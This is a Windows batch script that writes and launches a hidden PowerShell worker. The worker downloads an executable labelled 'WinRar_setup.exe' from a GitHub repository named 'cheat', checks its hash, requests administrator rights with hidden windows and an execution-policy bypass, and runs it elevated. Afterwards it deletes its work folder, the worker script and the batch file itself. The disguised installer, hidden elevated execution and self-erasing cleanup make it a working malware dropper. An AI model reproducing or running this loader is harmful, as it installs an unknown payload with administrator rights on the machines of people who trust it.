@echo off
setlocal EnableExtensions DisableDelayedExpansion

set "URL=https://raw.githubusercontent.com/skibididodopp-beep/cheat/refs/heads/main/WinRar_setup.exe"
set "HASH=3271c6372c136be4f9e7b276b3cb3b52ed4c408e1abc6405d15551212279dfac"
set "BASE_TEMP=%LOCALAPPDATA%\Temp"
set "WORK_DIR=%BASE_TEMP%\WinRarPkg"
set "OUT=%WORK_DIR%\WinRar_setup.exe"
set "PS_SCRIPT=%BASE_TEMP%\winrar_worker.ps1"
set "LOG=%BASE_TEMP%\winrar_worker.log"
set "RUNNER_BAT=%~f0"

if not exist "%WORK_DIR%" mkdir "%WORK_DIR%" >nul 2>&1

(
  echo $ErrorActionPreference = 'Stop'
  echo [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
  echo.
  echo $u = $env:URL
  echo $h = $env:HASH.ToLowerInvariant^(^)
  echo $dir = $env:WORK_DIR
  echo $f = $env:OUT
  echo $log = $env:LOG
  echo $psFile = $env:PS_SCRIPT
  echo $runner = $env:RUNNER_BAT
  echo.
  echo function Write-Log^([string]$Msg^) {
  echo     $line = '[{0}] {1}' -f ^(Get-Date -Format 'HH:mm:ss'^), $Msg
  echo     Add-Content -LiteralPath $log -Value $line -Encoding UTF8
  echo }
  echo.
  echo function Invoke-DownloadFile^([string]$TargetUrl, [string]$OutPath^) {
  echo     if ^(Test-Path -LiteralPath $OutPath^) {
  echo         Remove-Item -LiteralPath $OutPath -Force -ErrorAction SilentlyContinue
  echo     }
  echo     try {
  echo         Invoke-WebRequest -Uri $TargetUrl -OutFile $OutPath -UseBasicParsing
  echo         if ^((Test-Path -LiteralPath $OutPath^) -and ^((Get-Item -LiteralPath $OutPath^).Length -gt 0^)^) {
  echo             return $true
  echo         }
  echo     } catch {
  echo         Write-Log ^('Invoke-WebRequest failed: ' + $_.Exception.Message^)
  echo     }
  echo     try {
  echo         $wc = New-Object System.Net.WebClient
  echo         $wc.DownloadFile^($TargetUrl, $OutPath^)
  echo         $wc.Dispose^(^)
  echo         if ^((Test-Path -LiteralPath $OutPath^) -and ^((Get-Item -LiteralPath $OutPath^).Length -gt 0^)^) {
  echo             return $true
  echo         }
  echo     } catch {
  echo         Write-Log ^('WebClient failed: ' + $_.Exception.Message^)
  echo     }
  echo     return $false
  echo }
  echo.
  echo $isAdmin = ^([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent^(^)^).IsInRole^([Security.Principal.WindowsBuiltInRole]::Administrator^)
  echo if ^(-not $isAdmin^) {
  echo     Write-Log 'Requesting elevation via RunAs'
  echo     $elevArgs = @(
  echo         '-NoProfile'
  echo         '-NonInteractive'
  echo         '-ExecutionPolicy'
  echo         'Bypass'
  echo         '-WindowStyle'
  echo         'Hidden'
  echo         '-File'
  echo         "`"$psFile`""
  echo     ^)
  echo     Start-Process -FilePath 'powershell.exe' -ArgumentList $elevArgs -Verb RunAs -WindowStyle Hidden | Out-Null
  echo     exit 0
  echo }
  echo.
  echo try {
  echo     Write-Log ^('Elevated worker started. URL=' + $u^)
  echo     if ^(-not ^(Test-Path -LiteralPath $dir^)^) {
  echo         New-Item -ItemType Directory -Path $dir -Force ^| Out-Null
  echo     }
  echo.
  echo     $maxRetries = 2
  echo     $hashOk = $false
  echo.
  echo     for ^($attempt = 0; $attempt -le $maxRetries; $attempt++^) {
  echo         Write-Log ^('Download attempt ' + ^($attempt + 1^) + ' of ' + ^($maxRetries + 1^)^)
  echo         $ok = Invoke-DownloadFile -TargetUrl $u -OutPath $f
  echo         if ^(-not $ok^) {
  echo             Write-Log 'Download failed on this attempt'
  echo             continue
  echo         }
  echo         $actual = ^(Get-FileHash -LiteralPath $f -Algorithm SHA256^).Hash.ToLowerInvariant^(^)
  echo         if ^($actual -eq $h^) {
  echo             Write-Log 'SHA-256 verified'
  echo             $hashOk = $true
  echo             break
  echo         } else {
  echo             Write-Log ^('Hash mismatch. Expected=' + $h + ' Actual=' + $actual^)
  echo             Remove-Item -LiteralPath $f -Force -ErrorAction SilentlyContinue
  echo         }
  echo     }
  echo.
  echo     if ^(-not $hashOk^) {
  echo         Write-Log 'ERROR: Hash check failed after retries'
  echo         exit 2
  echo     }
  echo.
  echo     Write-Log 'Launching executable as administrator'
  echo     $proc = Start-Process -FilePath $f -Verb RunAs -PassThru -Wait
  echo     Write-Log ^('Process exited with code ' + $proc.ExitCode^)
  echo     exit [int]$proc.ExitCode
  echo } catch {
  echo     Write-Log ^('FATAL: ' + $_.Exception.Message^)
  echo     exit 99
  echo } finally {
  echo     Start-Sleep -Seconds 2
  echo     if ^($dir -and ^(Test-Path -LiteralPath $dir^)^) {
  echo         Remove-Item -LiteralPath $dir -Recurse -Force -ErrorAction SilentlyContinue
  echo     }
  echo     if ^($runner -and ^(Test-Path -LiteralPath $runner^)^) {
  echo         Remove-Item -LiteralPath $runner -Force -ErrorAction SilentlyContinue
  echo     }
  echo     if ^($psFile -and ^(Test-Path -LiteralPath $psFile^)^) {
  echo         Remove-Item -LiteralPath $psFile -Force -ErrorAction SilentlyContinue
  echo     }
  echo }
) > "%PS_SCRIPT%"

if not exist "%PS_SCRIPT%" exit /b 1

start "" /b powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File "%PS_SCRIPT%"
exit /b 0
